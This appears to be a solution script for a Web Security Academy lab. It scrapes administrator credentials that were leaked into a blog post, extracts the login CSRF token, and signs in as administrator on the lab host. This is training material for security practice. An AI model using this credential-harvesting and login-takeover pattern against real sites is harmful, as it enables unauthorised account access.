import requests, re
from bs4 import BeautifulSoup

s = requests.Session()

site = 'acb31f301e268e44c09829900010008c.web-security-academy.net'
post_url = f'https://{site}/post?postId=1'

resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
print(credentials)
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'administrator',
    'password' : credentials[1]
}
resp = s.post(login_url, data=logindata)